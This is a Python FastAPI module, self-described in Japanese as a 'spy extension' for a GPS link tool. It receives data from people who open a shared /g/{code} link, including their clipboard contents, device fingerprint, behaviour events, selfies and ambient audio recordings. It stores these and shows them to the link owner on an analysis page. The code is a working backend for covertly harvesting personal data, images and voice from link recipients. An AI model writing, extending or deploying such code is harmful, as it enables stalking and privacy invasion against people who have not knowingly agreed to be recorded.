"""スパイ拡張（新GPSモード用）。gps.py とは別モジュール。同じ gps.db に専用テーブルを持つ。

  POST /g/{code}/ev        行動ログ・クリップボード・端末指紋・自撮り
  POST /g/{code}/voice     環境音（base64）
  GET  /gp/{code}/spy      解析ページ
  GET  /api/gp/{code}/spy  解析JSON
"""
from __future__ import annotations

import json
import datetime as dt

from fastapi import APIRouter, Request, Depends, HTTPException
from fastapi.responses import HTMLResponse

from . import gps as G

router = APIRouter()

SPY_SCHEMA = """
CREATE TABLE IF NOT EXISTS spy_events(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, vid TEXT, kind TEXT,
  value REAL, text TEXT, ts TEXT);
CREATE INDEX IF NOT EXISTS spy_events_code_id ON spy_events(code, id);
CREATE TABLE IF NOT EXISTS spy_media(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, vid TEXT, kind TEXT,
  data TEXT, ms INTEGER, ts TEXT);
CREATE INDEX IF NOT EXISTS spy_media_code_id ON spy_media(code, id);
"""


def _db(owner):
    c = G._db(owner)          # gps.py 側のスキーマ（gps_extra 等）も同時に整う
    try:
        c.executescript(SPY_SCHEMA)
        c.commit()
    except Exception:
        pass
    return c


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


# ---------------- 収集 ----------------

@router.post("/g/{code}/ev")
async def event(code: str, request: Request):
    owner = G._owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}

    kind = str(body.get("kind") or "")[:20]
    if not kind:
        return {"ok": 0}
    vid = str(body.get("vid") or "")[:40]
    try:
        value = float(body.get("value") or 0)
    except Exception:
        value = 0.0

    text = body.get("text")
    if text is not None and not isinstance(text, str):
        try:
            text = json.dumps(text, ensure_ascii=False)
        except Exception:
            text = str(text)
    text = (text or "")[:20000]

    c = _db(owner)
    c.execute("INSERT INTO spy_events(code,vid,kind,value,text,ts) VALUES(?,?,?,?,?,?)",
              (code, vid, kind, value, text, _now()))

    # 自撮りは media にも残し、監視室の gps_extra にも書く
    if kind == "selfie" and text:
        c.execute("INSERT INTO spy_media(code,vid,kind,data,ms,ts) VALUES(?,?,?,?,?,?)",
                  (code, vid, "selfie", text, 0, _now()))
        try:
            row = c.execute("SELECT 1 FROM gps_extra WHERE code=? AND vid=?",
                            (code, vid)).fetchone()
            if row:
                c.execute("UPDATE gps_extra SET selfie=?, ts=? WHERE code=? AND vid=?",
                          (text, _now(), code, vid))
            else:
                c.execute("INSERT INTO gps_extra(code,vid,selfie,ts) VALUES(?,?,?,?)",
                          (code, vid, text, _now()))
        except Exception:
            pass

    try:
        c.execute("DELETE FROM spy_events WHERE code=? AND id NOT IN "
                  "(SELECT id FROM spy_events WHERE code=? ORDER BY id DESC LIMIT 5000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return {"ok": 1}


@router.post("/g/{code}/voice")
async def voice(code: str, request: Request):
    owner = G._owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    data = str(body.get("data") or "")
    if not data:
        return {"ok": 0}
    vid = str(body.get("vid") or "")[:40]
    try:
        ms = int(body.get("ms") or 0)
    except Exception:
        ms = 0
    c = _db(owner)
    c.execute("INSERT INTO spy_media(code,vid,kind,data,ms,ts) VALUES(?,?,?,?,?,?)",
              (code, vid, "voice", data[:900000], ms, _now()))
    try:
        c.execute("DELETE FROM spy_media WHERE code=? AND kind='voice' AND id NOT IN "
                  "(SELECT id FROM spy_media WHERE code=? AND kind='voice' "
                  "ORDER BY id DESC LIMIT 60)", (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return {"ok": 1}


# ---------------- 表示 ----------------

@router.get("/api/gp/{code}/spy")
def api_spy(code: str, u=Depends(G._auth)):
    owner = G._owner(code) or u
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    evs = [dict(r) for r in c.execute(
        "SELECT id,vid,kind,value,text,ts FROM spy_events WHERE code=? "
        "ORDER BY id DESC LIMIT 500", (code,)).fetchall()]
    media = [dict(r) for r in c.execute(
        "SELECT id,vid,kind,data,ms,ts FROM spy_media WHERE code=? "
        "ORDER BY id DESC LIMIT 60", (code,)).fetchall()]
    c.close()

    devices, clips, dwell, blur = [], [], [], 0
    for e in evs:
        if e["kind"] == "device":
            devices.append(e)
        elif e["kind"] == "clip":
            clips.append(e)
        elif e["kind"] in ("dwell", "exit"):
            dwell.append(e)
        elif e["kind"] == "blur":
            blur += 1
    selfies = [m for m in media if m["kind"] == "selfie"]
    voices = [m for m in media if m["kind"] == "voice"]

    return {
        "device": (devices[0] if devices else None),
        "clip": (clips[0] if clips else None),
        "dwell": dwell[:40],
        "blur": blur,
        "selfies": selfies,
        "voices": voices,
        "events": evs[:200],
        "server": _now(),
    }


@router.get("/gp/{code}/spy", response_class=HTMLResponse)
def spy_page(code: str, request: Request, u=Depends(G._auth)):
    owner = G._owner(code) or u
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    link = c.execute("SELECT * FROM gps_links WHERE code=?", (code,)).fetchone()
    c.close()
    if not link:
        raise HTTPException(404)
    return G._render("gps_spy.html", request, code=code, link=dict(link),
                     base=G._base(request), share=G._base(request) + "/g/" + code)